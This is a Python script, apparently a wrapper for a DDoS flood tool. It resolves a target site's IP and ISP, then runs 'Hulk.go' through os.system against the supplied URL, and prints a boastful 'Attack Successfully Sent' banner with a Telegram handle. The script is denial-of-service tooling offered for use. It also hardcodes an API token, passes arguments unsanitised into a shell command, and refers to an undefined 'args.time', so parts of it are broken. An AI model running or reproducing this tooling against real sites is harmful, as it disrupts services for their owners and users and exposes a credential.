import argparse
from datetime import datetime
import socket
import ipinfo
import os

# Token API dari IPinfo
access_token = '40e69d29bf68ac'  # Ganti dengan token IPinfo Anda
handler = ipinfo.getHandler(access_token)

def clean_url(url):
    # Hapus protokol (http:// atau https://) dari URL jika ada
    if url.startswith("http://"):
        return url[len("http://"):]
    elif url.startswith("https://"):
        return url[len("https://"):]
    return url

def get_ip(domain):
    try:
        # Mendapatkan alamat IP dari domain
        ip_address = socket.gethostbyname(domain)
        return ip_address
    except socket.gaierror:
        return "Unable to get IP address"

def get_isp(ip_address):
    try:
        # Mendapatkan informasi ISP dari IPinfo
        details = handler.getDetails(ip_address)
        if 'org' in details.all:
            isp = details.org
            return isp
        else:
            return "ISP not found"
    except Exception as e:
        return f"Error: {e}"

def main(url, duration):
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M')

    # Bersihkan URL dari http:// atau https://
    cleaned_url = clean_url(url)

    # Mendapatkan IP address dari URL yang sudah dibersihkan
    ip_address = get_ip(cleaned_url)

    # Jika berhasil mendapatkan IP, maka lanjut ke pengecekan ISP
    if ip_address != "Unable to get IP address":
        isp_info = get_isp(ip_address)
    else:
        isp_info = "Unable to retrieve ISP information"

    print(f"   Target Details :")
    print(f"        STATUS  : [ Attack Successfully Sent By iRazzGans ]")
    print(f"        TARGET  : [ {url} ]")
    print(f"        IP      : [ {ip_address} ]")
    print(f"        ISP     : [ {isp_info} ]")
    print(f"        THREADS : [ NO THREAD ]")
    print(f"        TIME    : [ {duration if duration else 'INFINITY'} ]")
    print(f"        METHOD  : [ KILL ]")
    print(f"   Attack Details :")
    print(f"        STATUS : [ Attack With 1 Conc ]")
    print(f"        HOUR   : [ {current_time} ]")
    print(f"        TELE   : [ t.me/iRazzGans ]")
    print(f"   Attack Was Successful And Has Been Completed")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Simulate an attack command.')
    parser.add_argument('url', type=str, help='URL to attack')
    parser.add_argument('methods', type=str, help='metod')
    parser.add_argument('duration', type=int, default=0, help='Duration to run the attack in seconds')

    args = parser.parse_args()

    # Call the Go script with the correct URL and duration
    os.system(f'go run Hulk.go -site {args.url} -data {args.methods} -duration {args.time}')
    main(args.url, args.duration)
